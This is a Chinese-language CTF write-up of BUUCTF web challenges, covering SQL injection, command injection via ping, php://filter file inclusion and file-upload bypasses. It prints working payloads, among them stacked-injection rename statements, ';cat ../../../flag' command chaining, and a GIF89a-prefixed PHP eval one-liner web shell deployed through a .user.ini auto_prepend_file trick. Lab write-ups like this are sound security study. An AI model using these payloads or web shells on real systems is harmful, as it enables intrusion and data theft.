# 一些BUUCTF做题记录

## [极客大挑战 2019]Havefun1

![72699633377](assets/1726996333774.png)

一起来撸猫

index页面上啥也没有，通过F12查看了一下源代码，发现了一段注释

![72699637863](assets/1726996378635.png)

代码审计：

​	php代码=>get请求 输入cat变量(表示用cat接收数据)会返回cat变量，输入dog会输出Syc(cat_cat_cat_cat)

![72699657109](assets/1726996571096.png)

直接输入了dog，直接就回显了flag？？？一点不藏啊？

输入了一下，正确！

## [强网杯 2019]随便注(堆叠注入+重命名)

![72699750643](assets/1726997506432.png)

**发现不属于数值型注入，所以是字符型注入**

![72699754088](assets/1726997540881.png)

![72699755166](assets/1726997551663.png)

**and 1=1 时有回显，and 1=2时无回显**

**确定为单引号字符型注入**

![72699763583](assets/1726997635835.png)

**使用union注入以及select时，发现回显提示了我们图上的关键词都被过滤掉了，所以这题没有办法使用select进行爆破**

![72699799991](assets/1726997999917.png)

**判断存在两个字段**

**因为select被过滤掉了，所以布尔盲注和时间注入也没法用了，尝试使用堆叠注入**

构造payload=>1' or 1=1 爆出表中所有的数据，发现没有我们需要的flag

![72700379934](assets/1727003799349.png)

![72700312700](assets/1727003127008.png)

成功爆出数据库名

用同样的方式爆出表名

![72700316773](assets/1727003167735.png)

desc`table.name`查看这个表

![72700339546](assets/1727003395465.png)

在windows下面，反单引号（`）是数据库、表、索引、列和别名用的引用符

发现flag在1919810931114514这个表中

但是words不需要，可以直接desc查看（估计是跟数据类型有关）

![72700353441](assets/1727003534416.png)

发现有id和data两列

> 重命名方法：即利用rename语句将我们需要查询的信息改名，改为可以查找的名字

猜测数据库里的select语句为

**selsect id,data from words where id =**

> 构造payload=> 1';rename table words to words1;rename `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#

![72700497972](assets/1727004979722.png)



修改完成后，再次使用1' or 1=1 #爆出表中数据





## [SUCTF 2019]EasySQL(堆叠注入+猜测select语句)

这道题也是使用堆叠注入

爆出数据库名：

![72700584746](assets/1727005847463.png)

爆出表名Flag，很明显flag就在这个表里

![72700579498](assets/1727005794983.png)

直接构造payload爆出Flag表中的内容，发现不行

![72700599980](assets/1727005999803.png)

猜测查询语句是select $_GET['query'] || flag from flag(不是一般人能想到的解题方法)

因此输入*,1

即select *,1||flag from Flag => select *,1 from Flag

就能够爆出Flag中的内容了

![72700619126](assets/1727006191268.png)

## [ACTF2020 新生赛]Exec(命令执行)

这是一道命令执行的题目

尝试ping一些自己

> 构造payload：127.0.0.1;ls

可以看到当前页面下有index.php

![72700773844](assets/1727007738445.png)

用cat命令查看index.php页面

查看源码可以看到当前页面的php源码

并没有找到flag

![72700793281](assets/1727007932810.png)

猜测可能是在父级文件中

> 构造payload：127.0.0.1;ls ../../../

找到了flag，因此查看当前路径下的flag文件

![72700811152](assets/1727008111527.png)

> 构造payload：127.0.0.1;cat ../../../flag
>

成功得到flag！！！

![72700818034](assets/1727008180346.png)

## [极客大挑战 2019]Secret File(文件包含)

一进去就长这样，感觉啥也没有

![72700831186](assets/1727008311868.png)



查看网页源代码

发现Archive_room.php下面好像有东西，试着点进去

![72700836849](assets/1727008368493.png)

![72700840695](assets/1727008406952.png)

点击SECRET，进入end.php界面

![72700842737](assets/1727008427370.png)

能猜到是文件包含的题目

等会儿，有一个地方我没注意到，看了别人解才发现的

Archive_room.php页面的源代码中secret的跳转href明明是action.php，但是点进去之后却变成了end.php

因此合理怀疑这个页面就是flag所在的页面，利用bp抓包得到

![72700899918](assets/1727008999184.png)

发送到重发器中再次发送，发送源代码中有一段提示，又出现了新的页面secr3t.php

![72700921448](assets/1727009214483.png)

尝试访问了一下这个页面

又出现了一段源代码

![72700930877](assets/1727009308779.png)

代码审计：

​	file接收参数，且../  tp  input data都会被过滤掉，很容易想到可以用php://filter

尝试访问flag.php页面，发现被挑衅了。。。

![72700946320](assets/1727009463204.png)

在secr3t.php利用php://filter伪协议

> 构造payload：?file=php://filter/convert.base64-encode/resource=flag.php
>

![72700993318](assets/1727009933184.png)

成功拿到经过了base64加密的flag

解密后成功拿到flag

![72701005486](assets/1727010054869.png)

## [极客大挑战 2019]LoveSQL

尝试万能密码：

![72709244364](assets/1727092443642.png)



爆出了用户名和密码

![72709247808](assets/1727092478086.png)

打算用手动注入爆出各种数据，但是因为是在url输入，所以不能使用#，所以使用url编码=>%23

![72709279794](assets/1727092797949.png)

order by 到 4 就会报错，说明只有三个字段

![72709296224](assets/1727092962249.png)

回显点是2，3

![72709305929](assets/1727093059299.png)

爆出库名和版本

![72709323738](assets/1727093237386.png)

爆出geek里的表名

![72709336080](assets/1727093360808.png)

猜测flag应该在后面那个乱七八糟的表名

爆出表中的字段

![72709346256](assets/1727093462563.png)

爆出字段中的内容

成功得到flag!!!

![72709398871](assets/1727093988710.png)

总结：

​	这道题在sql注入里没啥难度，就是可以使用万能密码进入页面这点可以记下来



## [GXYCTF2019]Ping Ping Ping(命令执行)

一打开页面啥也没，查看源代码啥也没，网络请求也啥也米有

但是能猜到当前页面的url的参数应该是用ip来接收ip地址

![72709483385](assets/1727094833851.png)

老套路：ping了一下自己，输入查看当前目录下的所有文件的命令，可以发现当前目录下有两个文件，flag.php和index.php

很明显，flag应该在flag.php中

![72709509614](assets/1727095096149.png)

想要直接查看，结果发现不让？！奥，大概是空格被过滤掉了

![72709556955](assets/1727095569553.png)

![72709518824](assets/1727095188242.png)

尝试用逗号连接，绕过空格，结果flag又被过滤了???服了

![72709542340](assets/1727095423400.png)

查看index.php页面看看，发现出现了一部分源代码

能够查看被过滤掉的东西

![72709570030](assets/1727095700307.png)

查看完整源代码

![72709580969](assets/1727095809696.png)

`博主想到了利用变量替换`学习下来！！！利用变量替换



flag藏在注释当中！！！

![72709595594](assets/1727095955941.png)



总结：

​	目前遇到的命令执行的题目都是ping一个ip，在ip后执行命令，可能是输入框，也可以能是作为?后传入的参数

## [极客大挑战 2019]Upload

![72723053053](assets/1727230530537.png)

一道文件上传的题目，尝试了上传hatccess文件无果，还上传了php文件也不行

一般检查文件的地方有：后缀名、content-type、文件头的部分内容。

这题的解法对我来说是第一次见，记录一下

> 修改文件后缀名和content-type
>
> - 修改文件名为phtml绕过常规的后缀名检查
> - 修改content-type为image/jpeg
> - **注意：phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析**

修改文件后缀和content-type

![72723154507](assets/1727231545073.png)

放包之后是这个页面，说明应该是上传成功的，但是因为网页对<?做了过滤，所以要绕过

![72723140810](assets/1727231408107.png)

因此我们要绕过这个限制

> 构造payload：
>
> GIF89a?
> <script language="php">eval($_REQUEST[1234])</script>
>
> **GIF89a?**是 GIF 格式图像文件的标志。它通常是 GIF 文件的文件头，用于标识文件格式。

成功上传

![72723204795](assets/1727232047955.png)

使用蚁剑连接

连接成功

![72723217162](assets/1727232171626.png)

在根目录下找到flag

![72723227890](assets/1727232278909.png)

## [ACTF2020 新生赛]Upload

还是一道文件上传的题目

尝试上传了php文件之后，发现弹出了提示框，显示只能上传这三种文件

![72723314903](assets/1727233149034.png)

尝试上传了图片码，发现是可以上传成功的，猜测它并不会检查图片中是否包含一句话木马

查看源代码，发现是前端验证

![72723366926](assets/1727233669268.png)

删去审查的函数，再次上传

发现左上角出现了第二种情况，猜测后端还有一次后缀名验证，尝试用phtml

![72723380251](assets/1727233802517.png)

这里有点问题，一直抓不到包，保留一下吧，不在这里浪费时间了

## [SUCTF 2019]CheckIn

依旧是一道文件上传的题目，特地找的，感觉每次遇到文件上传的题目，都像无头苍蝇。。。不知道从哪儿开始，尤其是没有给源码的时候，还是得多做

尝试提交了php文件，显示非法后缀

![72724648201](assets/1727246482012.png)

试着提交htaccess文件，exif_imagetype函数(读取一个图像的第一个字节并检查其签名)

提示我们没有图像

![72724661899](assets/1727246618990.png)

那我们再试着上传一个图片马，提示我们<?被过滤了掉了，感觉跟上题有点像，可不可以也用phtml的标签绕过

> 构造payload：
>
> GIF89a
>
> <script language='php'>@eval($_POST['shell']);</script>

![72724704461](assets/1727247044616.png)

利用bp抓包，上传shell.php木马，将木马的后缀名修改为jpg，并且使注入的一句话木马被解析成jpg文件

![72724952300](assets/1727249523005.png)

回显如下

也就是现在这个图片马是作为图片被解析的，里面的一句话木马并没有被解析，因此我们需要想办法让恶意代码被解析

![72724960407](assets/1727249604073.png)

> 新姿势：之前利用过.htaccess文件，可以把其他的后缀名作为php解析，但是这里对htaccess文件
>
> 这里使用一个php目录配置文件 .user.ini
>
> 作用：这里如果我们上传一个.user.ini 文件，那么当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取我

```
上传的文件内容
GIF89a                         //auto_prepend_file是在文件前插入，而auto_append_file是在文件最后才插入。                  
auto_prepend_file=shell.jpg       //需要注意上穿的文件名字要和设定的名字一样，这里可以设定多个
```

上传成功之后，再次上传我们的木马文件

![72725159209](assets/1727251592095.png)

使用蚁剑连接：

连接前先用phpinfo()进行查看

显然我的不行，脑子已经乱七八糟了，回宿舍再梳理一下吧

![72725359486](assets/1727253594862.png)

## [极客大挑战 2019]BabySQL

FUZZ字典绕过测试

![72725535390](assets/1727255353901.png)

![72725553386](assets/1727255533860.png)

![72725557632](assets/1727255576326.png)

尝试用万能密码1' or 1=1 --+发现不行，猜测or被过滤，用双写绕过，成功登录

![72725416176](assets/1727254161762.png)

再经过尝试，发现union和select也 用不了

![72725442182](assets/1727254421824.png)

尝试用双写绕过，发现是可以的，但是报错是列数不对

![72725447073](assets/1727254470738.png)

尝试一下seselectlect 1,2,3，成功回显

![72725467527](assets/1727254675270.png)

开始爆破！！！

爆出库名

![72725473318](assets/1727254733188.png)

尝试爆出所有库名

发现有一个ctf

![72725499896](assets/1727254998962.png)

爆出ctf库中的表

发现了flag

![72725613210](assets/1727256132106.png)

爆出Flag表中的字段

成功爆出了Flag表中的flag字段

![72725623608](assets/1727256236086.png)

爆出内容

找到了flag

![72725637324](assets/1727256373248.png)








































































